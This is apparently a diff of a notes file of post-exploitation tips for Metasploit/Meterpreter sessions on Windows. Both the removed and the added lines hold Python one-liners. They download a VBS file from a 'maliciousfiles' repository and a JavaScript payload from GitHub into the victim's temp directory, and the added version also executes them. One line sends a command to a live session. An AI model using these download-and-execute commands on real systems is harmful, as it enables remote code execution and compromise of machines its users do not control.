@@ -1,4 +1,14 @@
 # listed are some more uncommon things you can do from Metasploit
 # load the python module, execute system commands to download files
-load python; python_execute "import urllib; t=urllib.URLopener(); t.retrieve('https://raw.githubusercontent.com/subinacls/Bash-Full/master/maliciousfiles/eVilBS/invisi.vbs','%TEMP%\\inv.vbs');t.retrieve('https://raw.githubusercontent.com/subinacls/JSMeter/master/JSMeter.js','%TEMP%\\jsmeter.js');"
+load python
+
+#from Metasploit terminal you can also send commands to a specific session like so 
 sessions -i 1 -C 'load python; python_execute "import os; os.popen(\"notepad\")"'
+
+
+# what about more complex commands like download and execute some malicious code ?
+# how about this for example. Ever wish Windows had wget included in the os ?
+# remember that load python module we mentioned earlier ?
+# think you can write a python function to down and execute some code ?
+# Example:
+load python; python_execute "import getpass; aaa=getpass.getuser(); import urllib; t=urllib.URLopener(); t.retrieve('https://raw.githubusercontent.com/subinacls/JSMeter/master/JSMeter.js','C:\\\\Users\\\\'+aaa+'\\\\AppData\\\\Local\\\\Temp\\\\jsmeter.js');t.retrieve('https://raw.githubusercontent.com/subinacls/Bash-Full/master/maliciousfiles/eVilBS/invisi.vbs','C:\\\\Users\\\\'+aaa+'\\\\AppData\\\\Local\\\\Temp\\\\inv.vbs');import os; os.popen('C:\\\\Users\\\\'+aaa+'\\\\AppData\\\\Local\\\\Temp\\\\inv.vbs C:\\\\Users\\\\'+aaa+'\\\\AppData\\\\Local\\\\Temp\\\\jsmeter.js &')"
